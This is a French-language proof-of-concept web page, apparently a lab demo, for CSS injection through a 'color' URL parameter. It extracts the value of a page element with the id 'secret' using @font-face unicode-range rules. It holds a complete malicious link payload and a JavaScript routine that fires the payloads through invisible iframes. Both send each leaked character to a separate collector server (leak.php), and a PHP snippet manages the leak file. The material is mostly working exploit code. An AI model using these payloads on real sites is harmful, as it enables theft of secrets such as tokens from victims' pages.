<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Règle @font-face et descripteur unicode</title>
    </head>
    <body>
        <h1>Injection CSS - récupération de la valeur d'un élément HTML via @font-face et descripteur unicode</h1>
        <p>Fichier de données récupérées : <a href="./leak.html">leak.html</a></p>
        <form method="GET" action="">
            <button type="submit" name="action" value="delete">Effacer le fichier</button>
        </form>
        <?php
            if (isset($_GET['action']) && $_GET['action'] === 'delete') {
                $filePath = 'leak.html';

                if (file_put_contents($filePath, '') !== false) {
                    echo "<p>Le fichier '$filePath' a été effacé avec succès.</p>";
                } else {
                    echo "Impossible d'effacer le fichier '$filePath'.";
                }
            }
        ?>

        <h2>PoC #1 - Lien malveillant</h2>
        <a href="http://127.0.0.1/index.php?color=red;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=0);unicode-range:U%2b0030}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=1);unicode-range:U%2b0031}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=2);unicode-range:U%2b0032}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=3);unicode-range:U%2b0033}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=4);unicode-range:U%2b0034}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=5);unicode-range:U%2b0035}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=6);unicode-range:U%2b0036}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=7);unicode-range:U%2b0037}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=8);unicode-range:U%2b0038}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=9);unicode-range:U%2b0039}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=a);unicode-range:U%2b0041,U%2b0061}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=b);unicode-range:U%2b0042,U%2b0062}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=c);unicode-range:U%2b0043,U%2b0063}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=d);unicode-range:U%2b0044,U%2b0064}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=e);unicode-range:U%2b0045,U%2b0065}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=f);unicode-range:U%2b0046,U%2b0066}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=g);unicode-range:U%2b0047,U%2b0067}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=h);unicode-range:U%2b0048,U%2b0068}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=i);unicode-range:U%2b0049,U%2b0069}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=j);unicode-range:U%2b004A,U%2b006A}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=k);unicode-range:U%2b004B,U%2b006B}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=l);unicode-range:U%2b004C,U%2b006C}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=m);unicode-range:U%2b004D,U%2b006D}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=n);unicode-range:U%2b004E,U%2b006E}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=o);unicode-range:U%2b004F,U%2b006F}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=p);unicode-range:U%2b0050,U%2b0070}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=q);unicode-range:U%2b0051,U%2b0071}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=r);unicode-range:U%2b0052,U%2b0072}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=s);unicode-range:U%2b0053,U%2b0073}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=t);unicode-range:U%2b0054,U%2b0074}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=u);unicode-range:U%2b0055,U%2b0075}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=v);unicode-range:U%2b0056,U%2b0076}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=w);unicode-range:U%2b0057,U%2b0077}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=x);unicode-range:U%2b0058,U%2b0078}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=y);unicode-range:U%2b0059,U%2b0079}%23secret{font-family:attack;}@font-face{font-family:attack;src:url(http://127.0.0.1:81/leak.php?char=z);unicode-range:U%2b005A,U%2b007A}%23secret{font-family:attack;}">Cliquez ici !</a>

        <h2>PoC #2 - iFrames invisibles</h2>
        <form method="GET" action="">
            <button type="submit" name="action" value="start">Démarrer l'attaque</button>
        </form>               

        <div id="frames"></div>
        <div id="output"></div>

        <script>
            /* ==== CONFIG ==== */
            const RHOST = "http://127.0.0.1"
            const RURL = "/index.php?color=";
            const LHOST = "http://127.0.0.1:81"
            const LURL_LEAKCHAR = "/leak.php?char=";
            const HTML_ID_NAME = "secret";
            const PREFIX = "red;}";
            /********************/

            const CHARS_1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".split("");
            const CHARS_2 = "abcdefghijklmnopqrstuvwxyz".split("");
            const CHARS_3 = "0123456789".split("");
            const CHARS_4 = "_-".split("");
            const CHARS = CHARS_1.concat(CHARS_2, CHARS_3, CHARS_4);

            document.addEventListener('DOMContentLoaded', function () {
                const params = new URLSearchParams(window.location.search);
                const action = params.get('action');

                if (action === 'delete') {
                    document.getElementById("frames").innerHTML = "";
                }

                if (action === 'start') {
                    document.getElementById("frames").innerHTML = "";

                    for(i = 0 ; i < CHARS.length ; i++) {
                        payload = "@font-face{font-family:attack;src:url(" + LHOST + LURL_LEAKCHAR + CHARS[i] + ");unicode-range:"+ getUnicodeFromChar(CHARS[i]) +"}#" + HTML_ID_NAME + "{font-family:attack;}";
                        const url = RHOST + RURL + PREFIX + encodeURIComponent(payload);

                        const iframe = document.createElement('iframe');
                        iframe.src = url;
                        iframe.style.border = 'none';
                        iframe.style.width = '0';
                        iframe.style.height = '0';
                        document.getElementById("frames").appendChild(iframe);
                    }

                    const outputDiv = document.getElementById('output');
                    outputDiv.textContent = "Attaque terminée !";
                }   
            });

            function getUnicodeFromChar(char) {
                if (char.length === 1) {
                    return 'U+' + char.charCodeAt(0).toString(16).padStart(4, '0').toUpperCase();
                } else {
                    return "Veuillez entrer un seul caractère.";
                }
            }
        </script>
    </body>
</html>